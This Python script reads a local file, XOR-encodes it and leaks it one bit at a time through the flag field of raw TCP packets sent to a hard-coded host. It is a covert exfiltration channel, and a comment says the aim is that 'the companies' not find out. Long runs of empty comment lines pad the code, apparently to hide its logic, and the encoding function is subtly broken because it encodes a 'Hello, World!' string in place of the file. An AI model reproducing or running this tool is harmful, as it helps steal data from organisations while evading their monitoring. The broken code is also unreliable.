import socket
import random
import struct
import os

random_word = "words_are_not_safe_here" # i should do random ones next time, make sure that the companies doesn't find out
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#


def create_ip_header(src_ip, dst_ip):
    ip_ver = 4  # IPv4
    ip_ihl = 5  # Internet Header Length (5 words or 20 bytes)
    ip_dscp_ecn = 0  # Default DSCP and ECN
    ip_total_length = 40  # IP header + TCP header, no payload
    ip_id = os.urandom(2)  # Random ID
    ip_frag_off = 0  # No fragment
    ip_ttl = 64  # TTL
    ip_proto = socket.IPPROTO_TCP  # TCP protocol
    ip_checksum = 0  # Kernel will fill this in if set to 0
    ip_saddr = socket.inet_aton(src_ip)  # Source IP
    ip_daddr = socket.inet_aton(dst_ip)  # Destination IP

    ip_header = struct.pack('!BBHHHBBH4s4s', 
                            (ip_ver << 4) + ip_ihl, ip_dscp_ecn,
                            ip_total_length, int.from_bytes(ip_id, byteorder='big'), ip_frag_off,
                            ip_ttl, ip_proto, ip_checksum,
                            ip_saddr, ip_daddr)
    return ip_header

with open("file.txt", "r") as file:
    asd = file.read()
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

createa = random_word
def create_tcp_header(src_port, dst_port, seq, ack_seq, flags):
    tcp_src_port = src_port
     
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    tcp_dst_port = dst_port
    tcp_seq = seq
    tcp_ack_seq = ack_seq
    tcp_data_offset = 5  # 5x4 = 20 bytes
    tcp_reserved = 0
    tcp_flags = flags
    tcp_window = socket.htons(5840)
    tcp_checksum = 0
    tcp_urg_ptr = 0
     
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    tcp_offset_res = (tcp_data_offset << 4) + tcp_reserved
    tcp_header = struct.pack('!HHLLBBHHH', 
                             tcp_src_port, tcp_dst_port, tcp_seq, tcp_ack_seq,
                             tcp_offset_res, tcp_flags, tcp_window, tcp_checksum, tcp_urg_ptr)
    
    return tcp_header


def send_tcp_packet(src_ip, dst_ip, src_port, dst_port, RANDOMasde):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    seq = 0
     
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    ack_seq = 0
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    RANDOMasd = RANDOMasde  # You can customize this per packet
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    tcp_header = create_tcp_header(src_port, dst_port, seq, ack_seq, RANDOMasd)

 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    ip_header = create_ip_header(src_ip, dst_ip)
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    packet = ip_header + tcp_header
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    sock.sendto(packet, (dst_ip, dst_port))
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

    sock.close()


src_ip = '192.168.143.252' 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

dst_ip = '192.168.99.205'
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

dst_port = 80
## 10 hello word
# 
#
#
#
text = "Hello, World!"
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#

hello = "Hello, World!"
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#
 
#
#
#


def stuff(asd, key):
    key_len = len(key)
    
    binary_result = ''.join(format(ord(text[i]) ^ ord(key[i % key_len]), '08b') for i in range(len(text)))
    return binary_result

asd = stuff(asd, createa)

for nothing in asd:
    src_port = random.sample(range(10000,50000), 1)[0]
    if nothing == "0":
        RANDOMasd = 0x00  # do nothing
    else:
        RANDOMasd = 0x02  # flag that something is going on
    send_tcp_packet(src_ip, dst_ip, src_port, dst_port, RANDOMasd)
